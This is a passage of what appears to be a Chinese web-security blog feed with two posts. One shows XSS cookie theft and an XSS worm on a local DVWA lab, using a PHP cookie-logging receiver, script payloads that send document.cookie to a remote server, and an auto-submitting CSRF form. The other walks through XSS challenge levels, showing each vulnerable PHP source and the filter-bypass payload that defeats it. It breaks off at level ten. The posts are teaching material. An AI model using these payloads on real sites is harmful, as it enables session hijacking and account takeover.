        <content type="html"><![CDATA[<h2 id="xss盗取cookie"><a href="#xss盗取cookie" class="headerlink" title="xss盗取cookie"></a>xss盗取cookie</h2><h3 id="什么是cookie"><a href="#什么是cookie" class="headerlink" title="什么是cookie"></a>什么是cookie</h3><p>cookie是曲奇饼，啊开个玩笑，cookie是每个用户登录唯一id和账号密码一样可以登录到网站，是的你没有听错cookie可以直接登录，至于服务器怎么设置cookie<br>和cookie存储这里就不说了，需的要自行百度</p><h3 id="xss盗取cookie-dvwa演示"><a href="#xss盗取cookie-dvwa演示" class="headerlink" title="xss盗取cookie(dvwa演示)"></a>xss盗取cookie(dvwa演示)</h3><p>学习xss时觉得啊这，不就是一个弹窗吗，有啥用，经过学习后发现xss的危害还是挺大的，弹窗的目的只是说明这里可以执行动态脚本，那就可以干很多事情了</p><h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><p>官网:<a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">http://www.dvwa.co.uk/</a><br>下载地址:<a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a><br>下载方式:zip下载或git <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a><br>下载完成放入http服务下即可<br>我使用的是phpstudy下载地址:<a href="https://m.xp.cn/" target="_blank" rel="noopener">https://m.xp.cn/</a></p><h4 id="设置接受盗取cookie方式"><a href="#设置接受盗取cookie方式" class="headerlink" title="设置接受盗取cookie方式"></a>设置接受盗取cookie方式</h4><p>xss盗取的cookie肯定是要保存到我们自己的服务器上，可以设置一个接受cookie的php网页代码接受到请求携带cookie后保存到文件或者数据库中等都可以，当然也可以不设置存储，随便请求一个一个服务器网页存在不存在无所谓，因为请求可以保存到日志文件，但是看起来可能不方便而已，下面是保存cookie的php代码</p><pre><code>&lt;?phpif(isset($_GET[&#39;cookie&#39;]))                 //如果接收到cookie{    $file = fopen(&#39;./cookie.txt&#39;, &#39;a&#39;);    //打开存储的文件    fwrite($file, $_GET[&#39;cookie&#39;].&quot;\r\n&quot;); //将获取的cookie存储    fclose($file);                         //关闭文件}</code></pre><h4 id="放置xss-这里用存储型xss测试"><a href="#放置xss-这里用存储型xss测试" class="headerlink" title="放置xss(这里用存储型xss测试)"></a>放置xss(这里用存储型xss测试)</h4><pre><code>&lt;script&gt;document.location=&#39;http://127.0.0.1/cookies/cookies.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></pre><p>我这里用的本地的测试，document.cookie，就是获取cookie，然后携带cookie访问<a href="http://127.0.0.1/cookies/cookies.php?（换成自己服务器ip就可以了，这里我本地测试），先查看一下我们的cookie" target="_blank" rel="noopener">http://127.0.0.1/cookies/cookies.php?（换成自己服务器ip就可以了，这里我本地测试），先查看一下我们的cookie</a><br><img src="https://Lmg66.github.io/img/139.png" alt="图片"></p><p>然后点击我们放存储型xss的地方（xss(stored)）,发现跳转到了令一个网站，并且携带了你的cookie</p><p><img src="https://Lmg66.github.io/img/140.png" alt="图片"></p><p>在到cookie.php目录查看cookie.txt，可以发现cookie已经被存储，cookie被盗取，我们可以利用cookie进行登录<br><img src="https://Lmg66.github.io/img/141.png" alt="图片"><br>这种动静可能有点大，可以用js加载图片的方式来发送带有cookie的请求，</p><pre><code>&lt;script&gt;new Image().src = &#39;http://127.0.0.1/cookies/cookies.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></pre><p><a href="https://www.cnblogs.com/yangzhou33/p/9215937.html" target="_blank" rel="noopener">使用new Image()进行预加载</a><br><img src="https://Lmg66.github.io/img/142.png" alt="图片"><br>当然如果你还有其动静小的方法可以留言，当然还可以用来加载其他的xss神器js代码</p><pre><code>&lt;script src=&#39;&#39;&gt;</code></pre><h2 id="xss蠕虫"><a href="#xss蠕虫" class="headerlink" title="xss蠕虫"></a>xss蠕虫</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>有存储型xss，可以csrf</p><h3 id="原理（个人理解，如有错误可以评论联系我）"><a href="#原理（个人理解，如有错误可以评论联系我）" class="headerlink" title="原理（个人理解，如有错误可以评论联系我）"></a>原理（个人理解，如有错误可以评论联系我）</h3><p><img src="https://Lmg66.github.io/img/143.png" alt="图片"></p><h3 id="相关代码（只是简单的，有过滤，要考虑绕过）"><a href="#相关代码（只是简单的，有过滤，要考虑绕过）" class="headerlink" title="相关代码（只是简单的，有过滤，要考虑绕过）"></a>相关代码（只是简单的，有过滤，要考虑绕过）</h3><p>主体存储xss</p><pre><code>&lt;script&gt;document.location=&#39;csrf地址&#39;;&lt;/script&gt;</code></pre><p>csrf生成<br>用burpsuite抓包，右键，如图选择，copy复制，然后放到自己服务器等等，当然也可以自己编写csrf的poc，使之功能更加强大，可以自己点击等等，还有一些绕过等等，这只是简单的csrf的poc<br><img src="https://Lmg66.github.io/img/144.png" alt="图片"><br><img src="https://Lmg66.github.io/img/145.png" alt="图片"><br>csrf演示代码，抓取的dvwa包加了js自动点击</p><pre><code>&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;    &lt;form action=&quot;http://127.0.0.1/lmg/vulnerabilities/xss_s/index.php&quot; method=&quot;POST&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;txtName&quot; value=&quot;æµ&amp;#139;è&amp;#175;&amp;#149;&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;mtxMessage&quot; value=&quot;æµ&amp;#139;è&amp;#175;&amp;#149;&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;btnSign&quot; value=&quot;Sign&amp;#32;Guestbook&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;  &lt;script type=&quot;text/javascript&quot;&gt;                          // js自动点击      var form = document.getElementsByTagName(&#39;form&#39;)[0];      var input = document.getElementsByTagName(&#39;input&#39;)[3];      input.value = window.location.hash.substr(1);      form.submit();  &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>受害者储存xss和主体xss类似只是跳转的网页不同</p><pre><code>&lt;script&gt;document.location=&#39;csrf地址&#39;;&lt;/script&gt;</code></pre><h3 id="个人思考"><a href="#个人思考" class="headerlink" title="个人思考"></a>个人思考</h3><p>xss的蠕虫利用起来还是比较难的，要有存储型xss（还要各种绕过），和csrf，但是危害是很大的，不仅仅是传播文章，可以利用这个传播盗取更多人cookie，个人信息，位置，浏览器版本安装软件等等</p><h2 id="xss利用的思考（持续思考）"><a href="#xss利用的思考（持续思考）" class="headerlink" title="xss利用的思考（持续思考）"></a>xss利用的思考（持续思考）</h2><p>像反射型xss，dom型的xss不在局限于点一个很长的链接，可以利用其他第三方网站来跳转，也可以利用短链接，也可以利用二维码，二维码捆绑一个链接，所以扫描未知二维码是非常危险的事情<br>像存储型xss，可以利用储存型xss对其他网站进行流量攻击</p><h2 id="参考文章与说明"><a href="#参考文章与说明" class="headerlink" title="参考文章与说明"></a>参考文章与说明</h2><p><a href="https://www.freebuf.com/vuls/191274.html" target="_blank" rel="noopener">技术讨论 | 记一次XSS蠕虫渗透实验</a><br>说明：本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss小游戏源码分析</title>
      <link href="/posts/996d.html"/>
      <url>/posts/996d.html</url>
      
        <content type="html"><![CDATA[<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>下载地址:<a href="https://files.cnblogs.com/files/Lmg66/xssgame-master.zip" target="_blank" rel="noopener">https://files.cnblogs.com/files/Lmg66/xssgame-master.zip</a><br>使用:下载解压，放到www目录下(phpstudy)，http服务下都行，我使用的是phpstudy</p><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><h3 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;);window.location.href=&quot;level2.php?keyword=跨站师&quot;; }&lt;/script&gt;&lt;title&gt;第1关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第1关 先热个身吧&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;name&quot;];echo &quot;&lt;h2 align=center&gt;欢迎用户:&quot;.$str.&quot;&lt;/h2&gt;&quot;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/8deed969-b339-4c84-8654-b1a1e40e06de.png&quot; width=&quot;50%&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h3><p>对name没有任何的过滤输出到标签中,基本的xss都行</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><pre><code>level1.php?name=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><h3 id="查看源码-1"><a href="#查看源码-1" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level3.php?writing=苦尽甘来&quot;; }&lt;/script&gt;&lt;title&gt;第2关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第2关 窒息的操作&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/688da926-8a0b-452a-9a2b-82ba919328fb.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析:"></a>分析:</h3><p>用htmlspecialchars()函数，之前做过，会html实体化，&lt;&gt;会被转义<br>可以尝试”来闭合”</p><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot; onclick=alert(&#39;XSS&#39;) //&quot; onclick=alert(&#39;XSS&#39;) &quot;</code></pre><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><h3 id="查看源码-2"><a href="#查看源码-2" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level4.php?keyword=宁静致远&quot;; }&lt;/script&gt;&lt;title&gt;第3关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第3关 这该咋办啊&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword  value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&quot;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/ee7a688a-d75e-4ed7-8a79-96e62d3127e2.png&quot; width=&quot;15%&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析:"></a>分析:</h3><p>和第二关类似，只是变成了单引号，闭合单引号即可</p><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&#39; onclick=alert(&#39;xss&#39;) &#39;&#39; onclick=alert(&#39;xs&#39;) //</code></pre><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><h3 id="查看源码-3"><a href="#查看源码-3" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level5.php?keyword=逆水行舟&quot;; }&lt;/script&gt;&lt;title&gt;第4关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第4关 生无可恋&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/0d3f0d24-a861-4d20-97da-f807ea842be8.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析:"></a>分析:</h3><p>在第二关的基础上进行了&lt; &gt;的过滤，但第二关payload没有 &lt; &gt;仍然可以使用</p><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot; onclick=alert(&#39;XSS&#39;) //&quot; onclick=alert(&#39;XSS&#39;) &quot;</code></pre><h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><h3 id="查看源码-4"><a href="#查看源码-4" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level6.php?keyword=柳暗花明&quot;; }&lt;/script&gt;&lt;title&gt;第5关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第5关 没错又是搜索&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/cb30e912-eabc-4357-89eb-49e8de1b1961.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析:"></a>分析:</h3><p>strtolower()函数，把字符转换为小写，接着替换script标签和on使这个两个事件没法使用，但仍可以闭合引号，所以要使用其他标签通过javascript:alert(‘xss’)来触发弹出<br><img src="https://Lmg66.github.io/img/131.png" alt="图片"><br><img src="https://Lmg66.github.io/img/132.png" alt="图片"></p><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot;&gt;&lt;a href=javascript:alert(&#39;xss&#39;) &quot;&quot;&gt;&lt;a href=javascript:alert(&#39;xss&#39;) //</code></pre><h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><h3 id="查看源码-5"><a href="#查看源码-5" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level7.php?keyword=持之以恒&quot;; }&lt;/script&gt;&lt;title&gt;第6关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第6关 嗯 还是搜索&lt;/h1&gt;&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/92847238-8dda-473f-9c04-83986de1472a.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析:"></a>分析:</h3><p>替换了script标签,on,src,data,herf,且html实体化看起来似乎没问题，但相比前几关发现没有转换为小写，所以可大小写来绕过匹配</p><h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot; ONclick=alert(&#39;XSS&#39;) //&quot;&gt;&lt;a Href=javascript:alert(&#39;XSS&#39;) //</code></pre><h2 id="第7关"><a href="#第7关" class="headerlink" title="第7关"></a>第7关</h2><h3 id="查看源码-6"><a href="#查看源码-6" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level8.php?keyword=笨鸟先飞&quot;; }&lt;/script&gt;&lt;title&gt;第7关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第7关 猜一猜下面题目还有搜索嘛&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/17532328-f4cc-4bca-b283-c7f7b5a13f80.jpg&quot; width=&quot;20%&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析:"></a>分析:</h3><p>get方式传入keyword，strtolowe()函数变为小写，然后replace()函数匹配script，on，src，data，href，但是只是匹配了一次，所以可以嵌套绕过，最后htmlspecialchars(),所以&lt; &gt; 不能用，尝试闭合”</p><h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot; oonnclick=alert(&#39;XSS&#39;) //</code></pre><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><h3 id="查看源码-7"><a href="#查看源码-7" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level9.php?keyword=水滴石穿&quot;; }&lt;/script&gt;&lt;title&gt;第8关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第8关 老铁要和我换友链嘛？&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);echo &#39;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;?php echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/d2d2080f-746c-4276-9f63-585fc4fd4a9c.jpg&quot; width=&quot;20%&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析:"></a>分析:</h3><p>get方式传入keyword，strtolower()转换为小写，然后replace替换script，on，src，data，href，”（”号html实体化了）,然后发现又html实体化输入，似乎没有问题，然后发现友情链接,没有html实体化输入，可以尝试在这个位置绕过，但是都被过滤了，尝试编码绕过对JavaScript;alert(‘xss’)编码(呸，不是编码)转义<a href="https://www.jianshu.com/p/6dcefb2a59b2(参考链接)，目的是绕过replace，然后仍能被html解析" target="_blank" rel="noopener">https://www.jianshu.com/p/6dcefb2a59b2(参考链接)，目的是绕过replace，然后仍能被html解析</a><br><img src="https://Lmg66.github.io/img/133.png" alt="图片"></p><h3 id="payload-7"><a href="#payload-7" class="headerlink" title="payload:"></a>payload:</h3><pre><code>javascrip&amp;#x74:alert(&#39;xss&#39;)javascrip&amp;#x09t:alert(&#39;XSS&#39;)</code></pre><h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><h3 id="查看源码-8"><a href="#查看源码-8" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level10.php?keyword=持之以恒&quot;; }&lt;/script&gt;&lt;title&gt;第9关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第9关 添加友连again&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);echo &#39;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;?phpif(false===strpos($str7,&#39;http://&#39;)){  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;        }else{  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;}?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/51fb4236-2965-42ab-851e-0ec266b3c3ba.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析:"></a>分析:</h3><p>和第八关相同，只是判断链接是否合法，加上http://就可以了</p><h3 id="payload-8"><a href="#payload-8" class="headerlink" title="payload:"></a>payload:</h3><pre><code>javascrip&amp;#x74:alert(&#39;xss&#39;) //http://</code></pre><h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><h3 id="查看源码-9"><a href="#查看源码-9" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level11.php?keyword=自强不息&quot;; }&lt;/script&gt;&lt;title&gt;第10关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第10关 嗯 搜索又出现了&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/fed9cb1c-3111-49a8-b111-16081ac4b16c.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析:"></a>分析:</h3><p>传入keyword和t_sort,keyword没有过滤，但是html实体化输出，而且没在标签内，所以应该没问题，看t_sort，过滤了&lt; &gt; ,而且没有实体化输出<br>尝试闭合引号</p><h3 id="payload-9"><a href="#payload-9" class="headerlink" title="payload:"></a>payload:</h3><p><code>?keyword=123&amp;t_sort=&quot; 